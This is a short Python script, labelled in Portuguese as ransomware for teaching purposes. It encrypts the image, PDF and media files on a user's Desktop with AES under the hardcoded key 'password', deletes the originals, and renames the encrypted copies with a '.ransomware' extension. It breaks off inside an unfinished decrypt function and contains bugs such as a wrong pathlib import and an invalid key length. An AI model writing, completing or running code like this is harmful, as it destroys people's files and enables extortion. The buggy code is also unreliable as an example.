# ransonware feito com python para fins didáticos

# importando bibliotecas
 
import os
import glob 
import time
import pyaes
from pathlib import path

type_fyles = ["*.jpeg", "*.jpg", "*png", "*.pdf", "*.mp3", "*.mp4"]

print ('encrypting')
time.sleep(3)

#check in desktop

try:
    desktop = Path.home() / "Desktop"

except Exception: 
    pass

os.chdir(desktop)

def encrypting():
    for files in type_fyles:
        for format_fyle in glob.glob(files):
            print(format_fyle)
            f = open(f'{desktop}\\{format_fyle}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_fyle}')
            key = "password" # pass for decrypt
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # change file ".ransomware"

            new_file = format_fyle + ".ransomware"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()

def decrypting(decrypt_file):
    try: